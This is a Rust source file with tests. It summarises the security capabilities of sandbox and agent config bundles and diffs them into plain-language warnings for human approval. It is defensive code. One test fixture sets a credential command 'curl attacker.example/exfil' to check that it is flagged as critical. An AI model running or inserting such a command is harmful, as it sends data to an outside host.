//! Wave 2b (#765) — capability-summary diff and the approved-content store that
//! backs launch-time bundle approval.
//!
//! Scope of what THIS FILE provides: the load-bearing correctness piece flagged
//! by the task as non-negotiable — a [`CapabilitySummary`] derived from the SAME
//! typed structures [`crate::config::resolve_includes`] actually merges (never a
//! hand-maintained list of "interesting" field names), a diff between two
//! summaries rendered as plain-consequence sentences, and a content-addressed
//! approval store under `~/.varda` holding the last-approved COPY of a bundle
//! (not only its digest, so a diff is possible; see [`ApprovalStore`]).
//!
//! What this file deliberately does NOT do (left for a follow-up): decide WHO
//! may be prompted (TTY/sandbox/headless context detection), the interactive
//! prompt UI itself, the `varda config approve` subcommand, wiring into the
//! launch path, resident `needs_user` surfacing, or lifting
//! `enforce_varda_primitive_floor` on approval. Those all consume the types
//! here but are out of scope for this pass — see the task recap for why.

use std::collections::{BTreeMap, BTreeSet};
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

use anyhow::{Context, Result};

use crate::config::{Config, CredentialSource, EgressMode, fnox_env_ref, sha256_hex, varda_home};
use crate::sandbox::parse_mount;

/// The security-relevant capability surface of a resolved [`Config`], derived
/// directly from [`crate::config::SandboxConfig`] / [`crate::config::AgentConfig`]
/// / [`crate::config::CredentialConfig`] / [`crate::config::Route`] — never from a
/// separately hand-maintained field list. See
/// `capability_field_coverage_is_derivation_complete` at the bottom of this file:
/// it fails the build if a new capability-bearing field is added to those structs
/// without a corresponding line here.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct CapabilitySummary {
    /// Sandbox names whose `primitive == "local"` — escapes the sandbox and runs
    /// unsandboxed on the host. The highest-severity capability a bundle can
    /// request (Decision 4).
    pub local_primitive_sandboxes: BTreeSet<String>,
    /// `(sandbox_or_route_label, host)` — egress allow-list entries.
    pub egress_hosts: BTreeSet<(String, String)>,
    /// `(sandbox_or_route_label, mount_spec)` — mounts that are read-write and
    /// whose source resolves outside a plain project-relative path (an absolute
    /// path or a `~`-rooted one).
    pub rw_mounts_outside_project: BTreeSet<(String, String)>,
    /// `(agent_or_route_label, secret_name)` — `${fnox:...}` bindings reachable
    /// from a static env map or a `[[agents.X.credentials]]` entry (`from_secret`
    /// / `from_fnox`, resolved via [`crate::config::AgentConfig::effective_credentials`]).
    pub secrets_bound: BTreeSet<(String, String)>,
    /// `(agent_name, host_env_var_name)` — a host env var an agent's credentials
    /// can read, via `[[agents.X.credentials]] from_env = "..."` or the legacy
    /// `auth_token_env` sugar (both fold through
    /// [`crate::config::AgentConfig::effective_credentials`]). Since #793-#799,
    /// fragment-sourced agents are unconditionally refused this — but once #765's
    /// approval flow exists, a human reviewing a bundle must see this requested.
    pub host_env_reads: BTreeSet<(String, String)>,
    /// `(agent_name, command)` — a host command an agent's credentials execute at
    /// prepare time (`[[agents.X.credentials]] command = "..."`). The
    /// highest-severity credential capability: arbitrary host code execution,
    /// diffed and flagged `critical` like a `primitive = "local"` escape.
    pub host_commands: BTreeSet<(String, String)>,
    /// Agent names introduced.
    pub agents: BTreeSet<String>,
    /// Sandbox names introduced.
    pub sandboxes: BTreeSet<String>,
    /// Route globs introduced.
    pub route_globs: BTreeSet<String>,
    /// Sandbox name → its `egress_mode`. Diffed for CHANGES (not just additions):
    /// weakening enforcement on an already-allow-listed host (e.g. `strict` →
    /// `dns-pin`) changes no `egress_hosts` entry, so without this it would be a
    /// silent downgrade — exactly what Decision 3 exists to prevent.
    pub egress_modes: BTreeMap<String, EgressMode>,
}

fn mount_is_rw_outside_project(raw: &str) -> Option<PathBuf> {
    let spec = parse_mount(raw).ok()?;
    if !spec.writable {
        return None;
    }
    let source = spec.source;
    let is_outside_project = source.is_absolute() || source.starts_with("~");
    is_outside_project.then_some(source)
}

impl CapabilitySummary {
    /// Derive the capability surface of a fully-resolved (post-include-merge)
    /// [`Config`]. Called on the merged config, so it sees exactly what
    /// [`crate::config::resolve_includes`] produced — central content and
    /// included-bundle content are not distinguished here; the caller diffs two
    /// summaries (old bundle vs new bundle) to isolate what a bundle changed.
    pub fn from_config(config: &Config) -> Self {
        let mut summary = CapabilitySummary::default();

        for (name, sandbox) in &config.sandboxes {
            summary.sandboxes.insert(name.clone());
            summary
                .egress_modes
                .insert(name.clone(), sandbox.egress_mode);
            if sandbox.primitive == "local" {
                summary.local_primitive_sandboxes.insert(name.clone());
            }
            for host in &sandbox.egress {
                summary.egress_hosts.insert((name.clone(), host.clone()));
            }
            for mount in &sandbox.mounts {
                if let Some(source) = mount_is_rw_outside_project(mount) {
                    summary
                        .rw_mounts_outside_project
                        .insert((name.clone(), source.display().to_string()));
                }
            }
            for value in sandbox.env.values() {
                if let Some(secret) = fnox_env_ref(value) {
                    summary
                        .secrets_bound
                        .insert((format!("sandbox:{name}"), secret.to_owned()));
                }
            }
        }

        for (name, agent) in &config.agents {
            summary.agents.insert(name.clone());
            for value in agent.env.values() {
                if let Some(secret) = fnox_env_ref(value) {
                    summary
                        .secrets_bound
                        .insert((name.clone(), secret.to_owned()));
                }
            }
            // Canonical credential list (folds legacy `auth_token_env` in as
            // `from_env` sugar) matched by source the same way
            // `resolve_agent_credentials` in main.rs does. An entry with no or
            // multiple sources is a config error surfaced elsewhere at launch;
            // it has nothing to summarize here, so it's skipped rather than
            // failing summary derivation.
            for credential in agent.effective_credentials() {
                match credential.source() {
                    Ok(CredentialSource::Env(env_name)) => {
                        summary
                            .host_env_reads
                            .insert((name.clone(), env_name.to_owned()));
                    }
                    Ok(CredentialSource::Secret(secret_name)) => {
                        summary
                            .secrets_bound
                            .insert((name.clone(), secret_name.to_owned()));
                    }
                    Ok(CredentialSource::Command(cmd)) => {
                        summary.host_commands.insert((name.clone(), cmd.to_owned()));
                    }
                    Err(_) => {}
                }
            }
        }

        for route in &config.routes {
            summary.route_globs.insert(route.glob.clone());
            let label = format!("route:{}", route.glob);
            for mount in &route.mounts {
                if let Some(source) = mount_is_rw_outside_project(mount) {
                    summary
                        .rw_mounts_outside_project
                        .insert((label.clone(), source.display().to_string()));
                }
            }
            for value in route.env.values() {
                if let Some(secret) = fnox_env_ref(value) {
                    summary
                        .secrets_bound
                        .insert((label.clone(), secret.to_owned()));
                }
            }
        }

        summary
    }
}

/// One plain-consequence line describing a capability a bundle NEWLY requests
/// (present in `new`, absent from `old`). `critical` marks the class of change
/// that Decision 4 requires a stronger confirmation for (a `primitive = "local"`
/// escape) — callers must surface these first and distinctly from routine lines.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CapabilityChange {
    pub critical: bool,
    pub sentence: String,
}

/// Diff two capability summaries into plain-consequence sentences — never a TOML
/// key diff (Decision 3). Only ADDITIONS are reported: a bundle that only removes
/// capabilities is not a review-worthy escalation, so it re-pins silently. An
/// empty return means nothing security-relevant changed; the caller re-pins
/// without prompting. `old` being [`CapabilitySummary::default`] naturally
/// produces the "first use, full capability set" flow from Decision 1 — every
/// entry in `new` is, by definition, an addition over nothing.
pub fn diff_capabilities(
    old: &CapabilitySummary,
    new: &CapabilitySummary,
) -> Vec<CapabilityChange> {
    let mut changes = Vec::new();

    for name in new
        .local_primitive_sandboxes
        .difference(&old.local_primitive_sandboxes)
    {
        changes.push(CapabilityChange {
            critical: true,
            sentence: format!(
                "sandbox '{name}' runs UNSANDBOXED on your host (primitive = \"local\")"
            ),
        });
    }
    for (label, host) in new.egress_hosts.difference(&old.egress_hosts) {
        changes.push(CapabilityChange {
            critical: false,
            sentence: format!("'{label}' can now reach {host}"),
        });
    }
    for (label, source) in new
        .rw_mounts_outside_project
        .difference(&old.rw_mounts_outside_project)
    {
        changes.push(CapabilityChange {
            critical: false,
            sentence: format!("'{label}' can now write to {source}"),
        });
    }
    for (label, secret) in new.secrets_bound.difference(&old.secrets_bound) {
        changes.push(CapabilityChange {
            critical: false,
            sentence: format!("'{label}' can now read secret '{secret}'"),
        });
    }
    for (agent, cmd) in new.host_commands.difference(&old.host_commands) {
        changes.push(CapabilityChange {
            critical: true,
            sentence: format!("'{agent}' can execute a command on your host: {cmd}"),
        });
    }
    for (agent, env_name) in new.host_env_reads.difference(&old.host_env_reads) {
        changes.push(CapabilityChange {
            critical: false,
            sentence: format!("'{agent}' can read host env var '{env_name}'"),
        });
    }
    for name in new.agents.difference(&old.agents) {
        changes.push(CapabilityChange {
            critical: false,
            sentence: format!("introduces agent '{name}'"),
        });
    }
    for name in new.sandboxes.difference(&old.sandboxes) {
        changes.push(CapabilityChange {
            critical: false,
            sentence: format!("introduces sandbox '{name}'"),
        });
    }
    for glob in new.route_globs.difference(&old.route_globs) {
        changes.push(CapabilityChange {
            critical: false,
            sentence: format!("introduces route '{glob}'"),
        });
    }
    // Only sandboxes present in BOTH summaries can have "changed" (rather than
    // "introduced") enforcement — a brand-new sandbox's mode is already implied
    // by "introduces sandbox '...'" above.
    for (name, new_mode) in &new.egress_modes {
        let Some(old_mode) = old.egress_modes.get(name) else {
            continue;
        };
        if old_mode == new_mode {
            continue;
        }
        let sentence = if egress_mode_rank(*new_mode) < egress_mode_rank(*old_mode) {
            format!(
                "'{name}' egress enforcement weakened from {} to {}",
                egress_mode_label(*old_mode),
                egress_mode_label(*new_mode)
            )
        } else {
            format!(
                "'{name}' egress mode changed from {} to {}",
                egress_mode_label(*old_mode),
                egress_mode_label(*new_mode)
            )
        };
        changes.push(CapabilityChange {
            critical: false,
            sentence,
        });
    }

    // Critical (sandbox-escape / host-code-exec) changes first and distinct, per
    // Decision 4.
    changes.sort_by_key(|change| (!change.critical, change.sentence.clone()));
    changes
}

/// User-facing spelling of an [`EgressMode`], matching its `kebab-case` TOML
/// representation (what a human reading the config actually typed).
fn egress_mode_label(mode: EgressMode) -> &'static str {
    match mode {
        EgressMode::Strict => "strict",
        EgressMode::DnsPin => "dns-pin",
        EgressMode::Proxy => "proxy",
    }
}

/// Coarse enforcement-strength ordering for [`EgressMode`], used only to decide
/// whether a change reads as "weakened" vs. a neutral "changed". `DnsPin` is
/// name-resolution-only and direct-IP-bypassable (never real enforcement, see
/// [`crate::config::egress_is_enforced`]); `Strict`/`Proxy` both select real
/// enforcement where the provider supports it, so they rank equal here even
/// though they're spelled differently.
fn egress_mode_rank(mode: EgressMode) -> u8 {
    match mode {
        EgressMode::DnsPin => 0,
        EgressMode::Strict | EgressMode::Proxy => 1,
    }
}

/// Content-addressed store of the last-approved COPY of each bundle a human has
/// reviewed, under `~/.varda` (never in the repo, never inside the bundle's own
/// directory — Decision 3). Keyed by a hash of the bundle's canonicalized path
/// so the same bundle path always round-trips to the same slot, independent of
/// content (content is exactly what we're diffing against).
pub struct ApprovalStore {
    root: PathBuf,
}

impl ApprovalStore {
    pub fn open() -> Result<Self> {
        let root = varda_home()?.join("approved-bundles");
        fs::create_dir_all(&root)
            .with_context(|| format!("failed to create approval store at {}", root.display()))?;
        Ok(Self { root })
    }

    #[cfg(test)]
    fn open_at(root: PathBuf) -> Result<Self> {
        fs::create_dir_all(&root)
            .with_context(|| format!("failed to create approval store at {}", root.display()))?;
        Ok(Self { root })
    }

    /// Canonicalizing is a best-effort same-bundle-same-slot optimization (so
    /// `./bundle.toml` and `/abs/path/bundle.toml` land in the same slot), not a
    /// security boundary — the content that gets diffed is always read back from
    /// disk and compared byte-for-byte, never trusted based on the path alone. A
    /// canonicalize failure (e.g. the bundle was deleted between resolve and
    /// approve) therefore falls back to the raw path rather than erroring: worst
    /// case is a spurious "first use" prompt for a path that briefly failed to
    /// canonicalize, not a security gap.
    fn slot_path(&self, bundle_path: &Path) -> PathBuf {
        let canonical = bundle_path
            .canonicalize()
            .unwrap_or_else(|_| bundle_path.to_path_buf());
        let key = sha256_hex(canonical.to_string_lossy().as_bytes());
        self.root.join(format!("{key}.toml"))
    }

    /// The previously-approved content for `bundle_path`, if any has ever been
    /// recorded. `None` on first use.
    pub fn load_approved_content(&self, bundle_path: &Path) -> Result<Option<String>> {
        let slot = self.slot_path(bundle_path);
        match fs::read_to_string(&slot) {
            Ok(content) => Ok(Some(content)),
            Err(err) if err.kind() == std::io::ErrorKind::NotFound => Ok(None),
            Err(err) => Err(err)
                .with_context(|| format!("failed to read approved copy at {}", slot.display())),
        }
    }

    /// Record `content` (the exact bytes just verified/approved) as the
    /// approved copy for `bundle_path`, replacing whatever was recorded before.
    ///
    /// Writes to a per-call-unique temp file first, then [`fs::rename`]s it over
    /// the real slot path — `rename` within the same directory is atomic on the
    /// platforms varda targets, so a crash mid-write or a second concurrent
    /// writer (a different process, or the process-unique counter below for two
    /// callers in the same process) can never leave a half-written record
    /// visible under the real slot name; readers see either the old content or
    /// the complete new content, never a torn write.
    pub fn store_approval(&self, bundle_path: &Path, content: &str) -> Result<()> {
        let slot = self.slot_path(bundle_path);
        let unique = STORE_APPROVAL_TMP_COUNTER.fetch_add(1, Ordering::Relaxed);
        let tmp = slot.with_extension(format!("tmp.{}.{unique}", std::process::id()));
        fs::write(&tmp, content).with_context(|| {
            format!("failed to write staged approval copy at {}", tmp.display())
        })?;
        fs::rename(&tmp, &slot)
            .with_context(|| format!("failed to finalize approved copy at {}", slot.display()))?;
        Ok(())
    }
}

/// Disambiguates temp-file names for concurrent [`ApprovalStore::store_approval`]
/// calls from different threads within the SAME process (different processes are
/// already disambiguated by `std::process::id()` alone).
static STORE_APPROVAL_TMP_COUNTER: AtomicU64 = AtomicU64::new(0);

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::{
        AGENT_CONFIG_FIELDS, AgentConfig, AgentKind, CREDENTIAL_CONFIG_FIELDS, CredentialConfig,
        DEFAULT_CONFIG, ROUTE_FIELDS, Route, SANDBOX_CONFIG_FIELDS, SandboxConfig,
    };
    use std::collections::BTreeMap;

    /// A minimal, empty-of-routes/sandboxes/agents base config, parsed from the
    /// same `DEFAULT_CONFIG` template the rest of `config.rs`'s tests use ([`Config`]
    /// has no `Default` impl of its own).
    fn base_config() -> Config {
        let mut config: Config =
            toml::from_str(DEFAULT_CONFIG).expect("default config should parse");
        config.routes.clear();
        config.sandboxes.clear();
        config.agents.clear();
        config
    }

    fn sandbox_with_egress(hosts: &[&str]) -> SandboxConfig {
        SandboxConfig {
            egress: hosts.iter().map(|h| h.to_string()).collect(),
            ..SandboxConfig::default()
        }
    }

    #[test]
    fn identical_configs_diff_to_nothing() {
        let mut config = base_config();
        config
            .sandboxes
            .insert("dev".to_owned(), sandbox_with_egress(&["api.example.com"]));
        let summary = CapabilitySummary::from_config(&config);
        assert!(diff_capabilities(&summary, &summary).is_empty());
    }

    #[test]
    fn first_use_reports_the_full_capability_set_as_additions() {
        let mut config = base_config();
        config
            .sandboxes
            .insert("dev".to_owned(), sandbox_with_egress(&["api.example.com"]));
        let summary = CapabilitySummary::from_config(&config);
        let changes = diff_capabilities(&CapabilitySummary::default(), &summary);
        assert!(
            changes
                .iter()
                .any(|c| c.sentence.contains("api.example.com"))
        );
    }

    #[test]
    fn added_egress_host_is_reported_as_a_consequence_sentence() {
        let mut old_config = base_config();
        old_config
            .sandboxes
            .insert("dev".to_owned(), sandbox_with_egress(&[]));
        let mut new_config = base_config();
        new_config
            .sandboxes
            .insert("dev".to_owned(), sandbox_with_egress(&["evil.example.com"]));

        let old = CapabilitySummary::from_config(&old_config);
        let new = CapabilitySummary::from_config(&new_config);
        let changes = diff_capabilities(&old, &new);
        assert_eq!(changes.len(), 1);
        assert!(changes[0].sentence.contains("evil.example.com"));
        assert!(!changes[0].critical);
    }

    #[test]
    fn cosmetic_only_change_is_not_a_capability_change() {
        // Same resolved capabilities, different in-memory construction order —
        // stands in for "comment added" / "key reordered" at the TOML layer,
        // which never reaches CapabilitySummary in the first place.
        let mut a = base_config();
        a.sandboxes
            .insert("dev".to_owned(), sandbox_with_egress(&["x", "y"]));
        let mut b = base_config();
        b.sandboxes
            .insert("dev".to_owned(), sandbox_with_egress(&["y", "x"]));

        let sa = CapabilitySummary::from_config(&a);
        let sb = CapabilitySummary::from_config(&b);
        assert!(diff_capabilities(&sa, &sb).is_empty());
    }

    #[test]
    fn primitive_local_is_flagged_critical_and_sorted_first() {
        let mut config = base_config();
        config.sandboxes.insert(
            "escape".to_owned(),
            SandboxConfig {
                primitive: "local".to_owned(),
                ..SandboxConfig::default()
            },
        );
        let summary = CapabilitySummary::from_config(&config);
        let changes = diff_capabilities(&CapabilitySummary::default(), &summary);
        assert!(changes[0].critical);
        assert!(changes[0].sentence.contains("UNSANDBOXED"));
    }

    #[test]
    fn rw_mount_outside_project_is_reported_ro_mount_is_not() {
        // "dev" already exists in `old` (mirrors `added_egress_host_...` below) so
        // only the mount capability — not the sandbox's own introduction — is new.
        let mut old_config = base_config();
        old_config
            .sandboxes
            .insert("dev".to_owned(), SandboxConfig::default());
        let mut new_config = base_config();
        new_config.sandboxes.insert(
            "dev".to_owned(),
            SandboxConfig {
                mounts: vec!["/home/user/.aws:rw".to_owned(), "/etc/hosts:ro".to_owned()],
                ..SandboxConfig::default()
            },
        );
        let old = CapabilitySummary::from_config(&old_config);
        let new = CapabilitySummary::from_config(&new_config);
        let changes = diff_capabilities(&old, &new);
        assert_eq!(changes.len(), 1);
        assert!(changes[0].sentence.contains("/home/user/.aws"));
    }

    #[test]
    fn fnox_secret_binding_via_agent_env_is_reported() {
        let mut config = base_config();
        let mut env = BTreeMap::new();
        env.insert("TOKEN".to_owned(), "${fnox:aws-prod-key}".to_owned());
        config
            .agents
            .insert("worker".to_owned(), bare_agent(env, Vec::new()));
        let summary = CapabilitySummary::from_config(&config);
        let changes = diff_capabilities(&CapabilitySummary::default(), &summary);
        assert!(changes.iter().any(|c| c.sentence.contains("aws-prod-key")));
    }

    fn bare_agent(
        env: BTreeMap<String, String>,
        credentials: Vec<CredentialConfig>,
    ) -> AgentConfig {
        AgentConfig {
            untrusted: false,
            kind: AgentKind::Acp,
            command: "true".to_owned(),
            args: Vec::new(),
            max_prompt_tokens: None,
            working_dir: None,
            env,
            streams_output: None,
            auth_token_env: None,
            auth_token_target: None,
            credentials,
            interactive_command: None,
            interactive_args: None,
            resume_command_template: None,
            interpreter_agent: None,
            skip_recap: false,
        }
    }

    #[test]
    fn fnox_secret_binding_via_credentials_from_fnox_is_reported() {
        let mut config = base_config();
        config.agents.insert(
            "worker".to_owned(),
            bare_agent(
                BTreeMap::new(),
                vec![CredentialConfig {
                    from_env: None,
                    from_secret: None,
                    from_fnox: Some("vault/key".to_owned()),
                    command: None,
                    env: Some("VAULT_KEY".to_owned()),
                    file: None,
                    refresh_seconds: None,
                    optional: false,
                }],
            ),
        );
        let summary = CapabilitySummary::from_config(&config);
        let changes = diff_capabilities(&CapabilitySummary::default(), &summary);
        assert!(changes.iter().any(|c| c.sentence.contains("vault/key")));
    }

    #[test]
    fn new_route_glob_is_reported() {
        let mut config = base_config();
        config.routes.push(Route {
            glob: "**/*.rs".to_owned(),
            agents: Vec::new(),
            sandbox: None,
            mounts: Vec::new(),
            env: BTreeMap::new(),
            orchestration: None,
            verify: Vec::new(),
            untrusted: false,
        });
        let summary = CapabilitySummary::from_config(&config);
        let changes = diff_capabilities(&CapabilitySummary::default(), &summary);
        assert!(changes.iter().any(|c| c.sentence.contains("**/*.rs")));
    }

    #[test]
    fn approval_store_round_trips_and_diffs_against_previous_content() {
        let tmp = std::env::temp_dir().join(format!(
            "varda-approval-store-test-{:p}",
            &tmp_marker() as *const _
        ));
        let store = ApprovalStore::open_at(tmp.clone()).expect("open store");
        let bundle_path = Path::new("/some/shared/bundle.toml");

        assert!(store.load_approved_content(bundle_path).unwrap().is_none());

        store.store_approval(bundle_path, "old content").unwrap();
        assert_eq!(
            store.load_approved_content(bundle_path).unwrap().as_deref(),
            Some("old content")
        );

        store.store_approval(bundle_path, "new content").unwrap();
        assert_eq!(
            store.load_approved_content(bundle_path).unwrap().as_deref(),
            Some("new content")
        );

        let _ = fs::remove_dir_all(&tmp);
    }

    fn tmp_marker() -> u8 {
        0
    }

    /// Load-bearing per the task: fails the build if `SANDBOX_CONFIG_FIELDS` /
    /// `AGENT_CONFIG_FIELDS` / `CREDENTIAL_CONFIG_FIELDS` / `ROUTE_FIELDS` (the
    /// same field-name lists 718a's unknown-key rejection uses, so they already
    /// change whenever a struct gains a field) contain a field this test doesn't
    /// know how to classify. A new field must be added to exactly one of
    /// `CAPABILITY_BEARING` (and wired into `CapabilitySummary::from_config`) or
    /// `NOT_CAPABILITY_BEARING` (with a one-line reason) before this passes —
    /// so a capability-relevant field can never silently ship unsummarized.
    #[test]
    fn capability_field_coverage_is_derivation_complete() {
        const CAPABILITY_BEARING: &[&str] = &[
            "primitive",
            "mounts",
            "egress",
            "egress_mode",
            "env",
            "from_secret",
            "from_fnox",
            // AgentConfig.credentials — the `[[agents.X.credentials]]` list;
            // wired via `AgentConfig::effective_credentials()`. NB: the string
            // "command" is shared with AgentConfig.command (the binary to run,
            // NOT capability-bearing) — this list can't distinguish same-named
            // fields across structs, so classifying "command" here is
            // conservative-correct for CredentialConfig.command (a host command
            // source, the highest-severity capability, see gap #1) even though
            // it sweeps in the unrelated AgentConfig.command field too.
            "credentials",
            "command",
            // AgentConfig.auth_token_env / CredentialConfig.from_env — both fold
            // through `effective_credentials()` into a host env var read
            // (`CredentialSource::Env`), diffed via `CapabilitySummary::host_env_reads`.
            "auth_token_env",
            "from_env",
        ];
        const NOT_CAPABILITY_BEARING: &[&str] = &[
            // SandboxConfig — image identity/build/resources, not a capability grant.
            "image",
            "build",
            "image_from",
            "egress_proxy_image",
            "memory",
            "cpus",
            // AgentConfig — identity/behavior, not a new capability.
            "kind",
            "args",
            "max_prompt_tokens",
            "working_dir",
            "streams_output",
            "auth_token_target",
            "interactive_command",
            "interactive_args",
            "resume_command_template",
            "interpreter_agent",
            "skip_recap",
            // CredentialConfig — `env`/`file` are TARGETS (where the resolved value
            // lands), not sources; `refresh_seconds`/`optional` are delivery
            // mechanics of an already-modeled binding.
            "file",
            "refresh_seconds",
            "optional",
            // Route — `glob`/`agents`/`sandbox` are routing identity (which
            // already-summarized sandbox/agent applies), not a new grant;
            // `orchestration`/`verify` are out of scope for this pass (tracked in
            // the task recap as remaining work, not silently dropped).
            "glob",
            "agents",
            "sandbox",
            "orchestration",
            "verify",
        ];

        for field in SANDBOX_CONFIG_FIELDS
            .iter()
            .chain(AGENT_CONFIG_FIELDS)
            .chain(CREDENTIAL_CONFIG_FIELDS)
            .chain(ROUTE_FIELDS)
        {
            let covered =
                CAPABILITY_BEARING.contains(field) || NOT_CAPABILITY_BEARING.contains(field);
            assert!(
                covered,
                "field '{field}' is not classified in capability_field_coverage_is_derivation_complete; \
                 add it to CAPABILITY_BEARING (and CapabilitySummary::from_config) or to \
                 NOT_CAPABILITY_BEARING with a reason"
            );
        }
    }

    /// Companion to `capability_field_coverage_is_derivation_complete`: that test
    /// only proves every `CAPABILITY_BEARING` field NAME is classified, not that
    /// setting it actually produces a diffed change — a field could be listed as
    /// capability-bearing and then never wired into `from_config`/`diff_capabilities`
    /// without either test catching it. This builds one config with every
    /// capability-bearing field set to a non-default, "interesting" value and
    /// asserts each expected sentence fragment shows up in the diff against a
    /// totally empty summary. Honest limit: this is a fixed set of hand-picked
    /// fragments, not a generic prover — a new capability-bearing field must also
    /// be added here, not just to the name list above, to be covered.
    #[test]
    fn every_capability_bearing_field_actually_diffs() {
        let mut config = base_config();
        config.sandboxes.insert(
            "escape".to_owned(),
            SandboxConfig {
                primitive: "local".to_owned(),
                mounts: vec!["/home/user/.aws:rw".to_owned()],
                egress: vec!["evil.example.com".to_owned()],
                egress_mode: crate::config::EgressMode::DnsPin,
                ..SandboxConfig::default()
            },
        );
        let mut env = BTreeMap::new();
        env.insert("TOKEN".to_owned(), "${fnox:sandbox-secret}".to_owned());
        config.agents.insert(
            "worker".to_owned(),
            bare_agent(
                env,
                vec![
                    CredentialConfig {
                        from_secret: Some("agent-secret".to_owned()),
                        env: Some("AGENT_SECRET".to_owned()),
                        ..Default::default()
                    },
                    CredentialConfig {
                        from_env: Some("HOST_TOKEN".to_owned()),
                        env: Some("BOX_TOKEN".to_owned()),
                        ..Default::default()
                    },
                    CredentialConfig {
                        command: Some("mint-token".to_owned()),
                        env: Some("MINTED_TOKEN".to_owned()),
                        ..Default::default()
                    },
                ],
            ),
        );
        config.routes.push(Route {
            glob: "**/*.rs".to_owned(),
            agents: Vec::new(),
            sandbox: None,
            mounts: Vec::new(),
            env: BTreeMap::new(),
            orchestration: None,
            verify: Vec::new(),
            untrusted: false,
        });

        let summary = CapabilitySummary::from_config(&config);
        let changes = diff_capabilities(&CapabilitySummary::default(), &summary);
        let sentences: Vec<&str> = changes.iter().map(|c| c.sentence.as_str()).collect();

        let expect_any = |fragment: &str| {
            assert!(
                sentences.iter().any(|s| s.contains(fragment)),
                "expected a diff sentence containing '{fragment}', got: {sentences:?}"
            );
        };
        expect_any("UNSANDBOXED"); // primitive = "local"
        expect_any("/home/user/.aws"); // mounts (rw, outside project)
        expect_any("evil.example.com"); // egress
        expect_any("sandbox-secret"); // sandbox env ${fnox:...}
        expect_any("agent-secret"); // credentials.from_secret
        expect_any("HOST_TOKEN"); // credentials.from_env / auth_token_env family
        expect_any("mint-token"); // credentials.command
        expect_any("introduces agent 'worker'"); // agents
        expect_any("introduces sandbox 'escape'"); // sandboxes
        expect_any("**/*.rs"); // route glob
    }

    #[test]
    fn introduced_sandbox_is_reported() {
        let mut old_config = base_config();
        old_config
            .sandboxes
            .insert("dev".to_owned(), SandboxConfig::default());
        let mut new_config = base_config();
        new_config
            .sandboxes
            .insert("dev".to_owned(), SandboxConfig::default());
        new_config
            .sandboxes
            .insert("scratch".to_owned(), SandboxConfig::default());

        let old = CapabilitySummary::from_config(&old_config);
        let new = CapabilitySummary::from_config(&new_config);
        let changes = diff_capabilities(&old, &new);
        assert_eq!(changes.len(), 1);
        assert!(changes[0].sentence.contains("introduces sandbox 'scratch'"));
        assert!(!changes[0].critical);
    }

    #[test]
    fn credential_command_source_is_reported_as_critical() {
        let mut config = base_config();
        config.agents.insert(
            "worker".to_owned(),
            bare_agent(
                BTreeMap::new(),
                vec![CredentialConfig {
                    command: Some("curl attacker.example/exfil".to_owned()),
                    env: Some("TOKEN".to_owned()),
                    ..Default::default()
                }],
            ),
        );
        let summary = CapabilitySummary::from_config(&config);
        let changes = diff_capabilities(&CapabilitySummary::default(), &summary);
        let change = changes
            .iter()
            .find(|c| c.sentence.contains("curl attacker.example/exfil"))
            .expect("command credential should be reported");
        assert!(change.critical);
        assert!(change.sentence.contains("execute a command on your host"));
        // Critical changes sort first.
        assert!(changes[0].critical);
    }

    #[test]
    fn credential_from_env_source_is_reported() {
        let mut config = base_config();
        config.agents.insert(
            "worker".to_owned(),
            bare_agent(
                BTreeMap::new(),
                vec![CredentialConfig {
                    from_env: Some("HOST_SECRET_TOKEN".to_owned()),
                    env: Some("TOKEN".to_owned()),
                    ..Default::default()
                }],
            ),
        );
        let summary = CapabilitySummary::from_config(&config);
        let changes = diff_capabilities(&CapabilitySummary::default(), &summary);
        let change = changes
            .iter()
            .find(|c| c.sentence.contains("HOST_SECRET_TOKEN"))
            .expect("from_env credential should be reported");
        assert!(!change.critical);
        assert!(change.sentence.contains("read host env var"));
    }

    #[test]
    fn legacy_auth_token_env_is_reported_like_from_env() {
        let mut config = base_config();
        let mut agent = bare_agent(BTreeMap::new(), Vec::new());
        agent.auth_token_env = Some("ANTHROPIC_API_KEY".to_owned());
        config.agents.insert("worker".to_owned(), agent);
        let summary = CapabilitySummary::from_config(&config);
        let changes = diff_capabilities(&CapabilitySummary::default(), &summary);
        assert!(
            changes
                .iter()
                .any(|c| c.sentence.contains("ANTHROPIC_API_KEY") && !c.critical)
        );
    }

    #[test]
    fn egress_mode_weakened_on_existing_sandbox_is_reported() {
        let mut old_config = base_config();
        old_config.sandboxes.insert(
            "dev".to_owned(),
            SandboxConfig {
                egress: vec!["api.example.com".to_owned()],
                egress_mode: crate::config::EgressMode::Strict,
                ..SandboxConfig::default()
            },
        );
        let mut new_config = base_config();
        new_config.sandboxes.insert(
            "dev".to_owned(),
            SandboxConfig {
                egress: vec!["api.example.com".to_owned()],
                egress_mode: crate::config::EgressMode::DnsPin,
                ..SandboxConfig::default()
            },
        );

        let old = CapabilitySummary::from_config(&old_config);
        let new = CapabilitySummary::from_config(&new_config);
        let changes = diff_capabilities(&old, &new);
        // Same egress host set on both sides — only the mode change should show up.
        assert_eq!(changes.len(), 1);
        assert!(changes[0].sentence.contains("weakened"));
        assert!(changes[0].sentence.contains("strict"));
        assert!(changes[0].sentence.contains("dns-pin"));
        assert!(!changes[0].critical);
    }

    #[test]
    fn egress_mode_unchanged_produces_no_diff() {
        let mut config = base_config();
        config.sandboxes.insert(
            "dev".to_owned(),
            SandboxConfig {
                egress_mode: crate::config::EgressMode::DnsPin,
                ..SandboxConfig::default()
            },
        );
        let summary = CapabilitySummary::from_config(&config);
        assert!(diff_capabilities(&summary, &summary).is_empty());
    }

    #[test]
    fn approval_store_canonicalizes_bundle_path_before_hashing() {
        let tmp = std::env::temp_dir().join(format!(
            "varda-approval-canon-test-{:p}",
            &tmp_marker() as *const _
        ));
        let store = ApprovalStore::open_at(tmp.clone()).expect("open store");

        // A real file plus a "./..".-style relative path resolving to the same
        // canonical location must land in the same slot.
        let real_dir = tmp.join("project");
        fs::create_dir_all(&real_dir).unwrap();
        let bundle_path = real_dir.join("bundle.toml");
        fs::write(&bundle_path, "content").unwrap();
        let indirect_path = real_dir.join(".").join("bundle.toml");

        store.store_approval(&bundle_path, "approved").unwrap();
        assert_eq!(
            store
                .load_approved_content(&indirect_path)
                .unwrap()
                .as_deref(),
            Some("approved"),
            "canonicalized paths to the same file should share a slot"
        );

        let _ = fs::remove_dir_all(&tmp);
    }

    #[test]
